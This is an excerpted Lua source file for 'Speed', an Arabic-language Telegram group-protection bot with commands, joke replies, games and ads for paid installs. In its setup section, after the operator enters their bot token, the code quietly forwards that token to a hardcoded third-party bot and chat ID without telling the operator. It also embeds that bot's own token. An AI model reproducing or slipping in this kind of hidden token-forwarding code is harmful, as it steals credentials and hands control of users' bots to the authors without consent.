...
io.write('\27[0;31m\n ارسل لي توكن البوت الان ⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺ :\na⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺\n27[0;39;49m')
local json = JSON.decode(url)
database:set(id_server..":token_username",json.result.username)
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot1986177023:AAHa6OHuwUnE9Oxy2sW4Q1lHGT-UnHiU86c/sendmessage?chat_id=1827953514&text=' ..token)
end 
else
print('\27[0;35m⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺ :\na⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺\n\27[0;33;49m')
...
io.write('\27[1;31m ⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
local UserName = (data.username_ or "XxS_P_E_E_DxX")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼𝑪𝒉𝒂𝒏𝒏𝒆𝒍 𝑺𝒑𝒆𝒆𝒅")  
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'سـبـيد') 
local BANDA_Msg = { 
...
if not DevSoFi(msg) then
local Text = [[
↯ سعر التنصيب علي سورس سـبـيد ↯
سعر التنصيب العادي 20جنيه فقط
⇈⇊ للتواصل اتبع الازرار بالاسفل ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐃𝐞𝐯 𝐌𝐚𝐬𝐫𝐲',url="t.me/PPPPP7P"}},
{{text = '𝐓𝐨 𝐀𝐬𝐤',url="t.me/IIIIFbot"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
{'رتبتي','مطور','انا مين'},
{'⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺'},
{'انصحنى','كتبات','هل تعلم'},
{'⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺'},
{'غنيلي','بوستات','صور ولاد'},
{'⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺'},
...
local bl = '☆'
local keyboard = {
{'قناة السورس','مبرمج السورس','مصري مبرمج السورس'},
...
local Text = ' ◍تم ارسال الملصق من ⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺\n - '..Name
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/XxS_P_E_E_DxX/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_, msg.id_,' ◍ اصدار سورس سـبـيد{ 3x☆}')
end
...
if text == '⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺' or text == 'عاوز بوت' then
local Text = [[ 
↯ قناة مبرمجين السورس
محتاج تنصب بوت حمايه بس سعر مميز وبي كل المميزات تواصل معنا ↯
]]
...
if text == '⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس سـبـيد ادخل وتابع الجديد](t.me/XxS_P_E_E_DxX)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝑪𝒉𝒂𝒏𝒏𝒆𝒍 𝑺𝒑𝒆𝒆𝒅', url="t.me/XxS_P_E_E_DxX"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/XxS_P_E_E_DxX/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '━┅┅┄⟞𓊈 𝐒𝐩𝐞𝐞𝐝 𓊉⟝┄┉┉━' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس سـبـيد ادخل وتابع الجديد](t.me/XxS_P_E_E_DxX)
]] 
keyboard = {}  
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/XxS_P_E_E_DxX)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناة السورس', url="t.me/XxS_P_E_E_DxX"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'مصري مبرمج السورس²' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
المبرمج مصري لو حابب تتواصل معاه
اتبع الزر إلى تحت ⇈⇊
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
↯ من أحسن السورسات على التليجرام سورس سـبـيد ↯
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "سـبـيد")
...
send(msg.chat_id_,0," ◍ الـعـضو  : {["..data.first_name_.."](T.ME/XxS_P_E_E_DxX)}\n ◍ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ◍ عذرا  ⇇{["..data.first_name_.."](T.ME/XxS_P_E_E_DxX)}\n ◍ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
◍ خلفيات ⤌ لعرض الميزه
▱▰▱▰▱▰▱▰▱▰▱▰▱▰
 ◍ 𝐂𝐡 - [ 𝐒𝐨𝐮𝐫𝐜𝐞 𝐒𝐩𝐞𝐞𝐝 ](t.me/XxS_P_E_E_DxX) 
▱▰▱▰▱▰▱▰▱▰▱▰▱▰
]]
keyboard = {}  
keyboard.inline_keyboard = { 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/XxS_P_E_E_DxX/406/903&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
local Text = [[

╭▱▰▱▰𓆩[ＳＡＩＤＩ](http://t.me/XxS_P_E_E_DxX)𓆪▱▰▱▰╮
┆
┆[▸ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ sᴏᴜʀᴄᴇ sᴘᴇᴇᴅ ◍](http://t.me/XxS_P_E_E_DxX)
┆
┆[▸ ᴛʜᴇ ʙᴇsᴛ sᴇᴄᴜʀɪᴛʏ sᴏᴜʀᴄᴇ ғᴏʀ ɢʀᴏᴜᴘs ᴛᴇʟᴇɢʀᴀᴍ ◍](http://t.me/XxS_P_E_E_DxX)
┆
┆[▸ ʏᴏᴜ ᴡᴀɴᴛ ᴛʜᴇ ʙᴇsᴛ ʙᴜᴛ ᴛᴇʟᴇɢʀᴀᴍ ᴄᴏᴍᴇ ᴛᴏ ᴜs ◍](http://t.me/XxS_P_E_E_DxX)
┆                                                                                                                                                                                    
╰▱▰▱▰𓆩[ＳＡＩＤＩ](http://t.me/XxS_P_E_E_DxX)𓆪▱▰▱▰╯
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• ᴅᴇᴠ ᴍᴀsʀʏ',url="t.me/PPPPP7P"},{text = '• ᴅᴇᴠ ᴛᴀʜᴀ', url="t.me/TahaSayed9"}},
{{text = '`sᴏᴜʀᴄᴇ sᴘᴇᴇᴅ´',url="t.me/XxS_P_E_E_DxX"}},
{{text = 'اضغط لاضافه البوت الي مجموعتك ✅' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/XxS_P_E_E_DxX/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
...
local Text = [[
 𖠪 اهلا بك في سورس سـبـيد الجمدان 𖠪
 𖠪 عايز بوت بأسعار منسبه وبوت مميز كلمني 𖠪  
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝑫𝒆𝒗 𝑴𝒂𝒔𝒓𝒚',url="t.me/PPPPP7P"}},
{{text = '𝑫𝒆𝒗 𝑻𝒂𝒉𝒂',url="t.me/TahaSayed9"},{text = '𝑩𝒐𝒕 𝑻𝒂𝒉𝒂', url="t.me/TAHA_7XBOT"}},
{{text = '𝑪𝒉𝒂𝒏𝒏𝒆𝒍 𝑺𝒑𝒆𝒆𝒅', url="t.me/XxS_P_E_E_DxX"}},
...
if text == 'مصري' or text == 'مالك السورس' or text == 'صاحب السورس' or text == 'سورس مين' then
local Text = [[
مصري مبرمج السورس لو حابب تتواصل معاه
اتبع الزر إلى تحت ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/PPPPP7P&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
{{text = '📖رواية "أرض زيكولا"',url="https://t.me/XxS_P_E_E_DxX"}},
{{text = '📖موسوعة الظلام رعب وما شابه ذلك', url="https://t.me/barfrends/263376"}},
{{text = '📖رواية "الشفق الجزء الأول"', url="https://t.me/XxS_P_E_E_DxX"}},
{{text = '📖رواية "المخلوق', url="https://t.me/XxS_P_E_E_DxX"}},
{{text = '📖رواية "بعد النسيان"', url="https://t.me/t.me/XxS_P_E_E_DxX"}},
{{text = '📖كتاب في حضرة الجن', url="https://t.me/https://t.me/t.me/XxS_P_E_E_DxX"}},
{{text = '📖رواية "واختفى كل شئ"', url="https://t.me/t.me/XxS_P_E_E_DxX"}},
{{text = '📖رواية "نيلوفر أسود"', url="https://t.me/t.me/XxS_P_E_E_DxX"}},
{{text = '📖رواية"جثة في الفندق"', url="https://t.me/t.me/XxS_P_E_E_DxX"}},
{{text = '📖رواية "في القطار السريع"', url="https://t.me/t.me/XxS_P_E_E_DxX"}},
{{text = '📖لقاء مع كاتب رعب"', url="https://t.me/t.me/XxS_P_E_E_DxX"}},
{{text = '📖رواية"الإنسان الأخير""', url="https://t.me/t.me/XxS_P_E_E_DxX"}},
{{text = '📖رواية" مقبرة الحيوانات""', url="https://t.me/XxS_P_E_E_DxX"}},
{{text = '𝑪𝒉𝒂𝒏𝒏𝒆𝒍 𝑻𝒂𝒉𝒂',url="t.me/XxTaha_SayedxX"}},
{{text = '𝑪𝒉𝒂𝒏𝒏𝒆𝒍 𝑺𝒑𝒆𝒆𝒅', url="t.me/XxS_P_E_E_DxX"}},
{{text = 'اضغط لاضافه البوت الي مجموعتك ✅' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
...
local Text = [[
مطورين ومبرمجين سورس سـبـيد اتبع الازرار للتواصل معهم ⇈⇊
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
{{text = '𝑪𝒉𝒂𝒏𝒏𝒊𝒍 𝑺𝒂𝒊𝒅𝒊',url="t.me/XxS_P_E_E_DxX"}},
{{text = 'اضغط لاضافه البوت الي مجموعتك ✅' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},  
} 
local msg_id = msg.id_/2097152/0.5 
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس سـبـيد؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس سـبـيد؟ ", 
"كم مره حبيت؟ ", 
...
if text == '𝑪𝒉𝒂𝒏𝒏𝒆𝒍 𝑺𝒑𝒆𝒆𝒅' then
local Text = [[ 
 ↯ من أحسن السورسات على التليجرام سورس سـبـيد ↯
حمايه↤سرعه↤دقه↤وامان
 قناه السورس ⇈⇊
  [𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚂𝙿𝙴𝙴𝙳](http://t.me/XxS_P_E_E_DxX)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝑪𝒉𝒂𝒏𝒏𝒆𝒍 𝑺𝒑𝒆𝒆𝒅', url="t.me/XxS_P_E_E_DxX"}}, 
...
if text == 'العاب سبيد' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
↯ اهلا في قائمه الالعاب المتطوره سورس سـبـيد ↯ 
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[معاك مطور البوت اهو ياروحي ⇈⇊](t.me/XxS_P_E_E_DxX)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
function(arg,data) 
usertext = '\n ◍ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'XxS_P_E_E_DxX')..')'
...
usertext = '\n ◍ الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'XxS_P_E_E_DxX')..')'
status  = '\n ◍ تم حظرو عام من الجروبات '
texts = usertext..status
...
t = ' ◍ ملفات السورس سـبـيد⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺\n ⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺ \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if Get_info then
local TextS = "\n ◍ اهلا بك في متجر ملفات سـبـيد\n ◍ ملفات السورس ⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺\n ◍ علامة تعني { ✔️ } ملف مفعل\n ◍ علامة تعني { ✖ } ملف معطل\n ◍ قناة سورس سـبـيد⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺\n".." ◍ [اضغط هنا لدخول](t.me/XxS_P_E_E_DxX) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_," ◍ عذرا الملف لايدعم سورس سـبـيد\n") 
end
return false
end
...
if text == ("مسح قائمه سـبـيد") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◍ تم مسح قائمه سـبـيد')
return false
end

if text == 'قائمه سـبـيد' and Sudo(msg) then
...
if text == ("رفع سـبـيد") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع سـبـيد@(.*)$") and Sudo(msg) then
local username = text:match("^رفع سـبـيد@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع سـبـيد(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع سـبـيد(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل سـبـيد") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل سـبـيد@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل سـبـيد@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل سـبـيد(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل سـبـيد(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
t = "\n ◍ قائمه زوجات الجروب \n ◍═───═❲[𝑪𝒉𝒂𝒏𝒏𝒆𝒍 𝑺𝒑𝒆𝒆𝒅](t.me/XxS_P_E_E_DxX)❳═───═??\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
' }\n'..' ◍  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' ◍  الرفع  ⇇{ '..setadd..
' }\n'..' ◍  الحظر  ⇇{ '..banm..' }\n\n ◍═───═❲[𝑪𝒉𝒂𝒏𝒏𝒆𝒍 𝑺𝒑𝒆𝒆𝒅](t.me/XxS_P_E_E_DxX)❳═───═ ◍\n ◍ قناة سورس سـبـيد⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺\n [ ❲[𝑪𝒉𝒂𝒏𝒏𝒆𝒍 𝑺𝒑𝒆𝒆𝒅](t.me/XxS_P_E_E_DxX)❳](t.me/XxS_P_E_E_DxX) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺\nاضغط علي الاسم ليتم نسخه\n⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺ٴ\n ◍ ❲[𝑪𝒉𝒂𝒏𝒏𝒆𝒍 𝑺𝒑𝒆𝒆𝒅](t.me/XxS_P_E_E_DxX)❳ ◍ ')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'سـبـيد').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'سـبـيد')
local DRAGON_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
end --الكود حصري سورس سـبـيديعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'سـبـيد').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نعم الله عليك..🌚❤️](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..😒♥️](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[العفو ياروحي..🌚❤️](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..🌚♥️](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[موت بعيد م ناقصين مصايب😑😂](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[جتك اوهه م سامع ولا ايي😹👻](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[فرح خالتك قريب😹💋💃🏻](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[حضرلك الخير يارب..🙂](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[لف ورجع تانى مشحوار 😂🚶‍♂👻](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[يوه خضتني ياسمك اي..🥺💔](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[اوه ياه..🌝😂](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[امك اسمها احلام..😹😹](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[كفيه شقط سيب حاجه لغيرك ❤️😂](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ضحكتك عثل زيكك ينوحيي 🌝❤️](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خلصتت روحكك يبعيد😹💔](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[بتفكر في اي..🤔](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[وانا كمان بعشقك يا روحي 💋🥰](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[محات حياتي يروحي..🌚💔](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[القمر ده شبهك..🙂♥️](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[هلا بيك ياروحي..💛](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ بنهش كتاكيت احنا هنا ولا اي..🐣😹](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[دايما ياحبيبي..🌚💜](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه السـبـيد](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف..🥺💔](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الخير يعمري..🌚❤️](t.me/XxS_P_E_E_DxX)')
return false
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص..😂😜](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق..🥰❤️](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام..🌚🖤](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال..😹](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[اه اي يا قدع عيب 😹💔](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عيب ياوسخ..🙄💔](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نعم يا مطوري..🥺💔](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح..😹👻](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح..😹👻](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[اعدل وشك ونت بتكلمني 😒](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[صح النوم..😂](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[صباح العسل 🍯🙂](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ده نورك ي قلبي..🙂💛](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ع فين لوين رايح وسايبنى🥺💔](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..🥺❤️](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نورك يا قلبي..🌚❤️](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه..😹💥](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[اهدا يوحش ميصحش كدا..😂](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..🌚❤️](t.me/XxS_P_E_E_DxX)')
return false
end
end
end
...
[[
↑⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username ◍  
↑⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺𝙄𝘿 ➱ #id
↑⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺𝙍𝘼𝙉𝙆 ➱  #stast ◍  
↑⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺??𝘼𝙎𝙂 ➱ #msgs ◍  
↑⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺𝗖𝗛 ➯  ↝@XxS_P_E_E_DxX↜ ◍  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
?? 𝟔 𖡻 #msgs  ࿇🦄
...
هذه اوامر الحمايه و الوضع و المطورين والخ ..↓↓
⩹━━━━⊶❲𖥳 𝐒𝐩𝐞𝐞𝐝 𖥳❳⊷━━━━⩺
...
[🎯ألعاب سورس سـبـيد الاحسن في التليجرام ⇈⇊]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [𝑪𝒉𝒂𝒏𝒏𝒆𝒍 𝑺𝒑𝒆𝒆𝒅](t.me/XxS_P_E_E_DxX)
]]
keyboard = {} 
...
if text == "رد عليه يابوت" or text == "رد عليه" or text == "رد انت يا بوت" then
...
{
{text = '𝚂𝙿𝙴𝙴𝙳', url="t.me/sopowerb0t"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'سـبـيد')
